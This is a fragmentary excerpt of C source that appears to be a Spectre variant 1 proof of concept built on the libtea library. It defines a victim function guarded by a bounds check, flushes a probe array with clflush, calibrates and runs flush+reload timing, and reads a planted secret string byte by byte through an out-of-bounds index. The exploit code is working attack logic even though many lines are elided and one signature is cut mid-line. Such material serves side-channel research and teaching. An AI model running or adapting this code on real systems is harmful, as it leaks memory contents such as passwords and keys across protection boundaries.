...
********************************************************************/
 ...
 char *secret = "secret is :1047289dhiwdgdbwicqbi2qfjnh";
 
 uint8_t temp = 0; /* To not optimize out victim_function() */

 void victim_function(size_t x) {
  libtea_flush(&array1_size);
 if (x<array1_size) {
 ...
 ********************************************************************/
 ...
 int score[2],libtea_instance* instance) {
 ...
 for (i = 0; i < 256; i++)
libtea_flush(&array2[i * 512]); /* clflush */
 ...
 * or malicious_x if j % 6 == 0 */
 ...
 flag=libtea_flush_reload(instance,addr);
 if (flag==1 && mix_i != array1[tries % array1_size]){
 ...
 libtea_instance* obj= libtea_init_nokernel();
 if(!obj){
    libtea_info("libtea init failed");
    return 1;
}else{
      libtea_info("libtea init sucess!");
}
 libtea_calibrate_flush_reload(obj);
 ...
 readMemoryByte(malicious_x++, value, score,obj);
...
// Calculate and print the total time in seconds
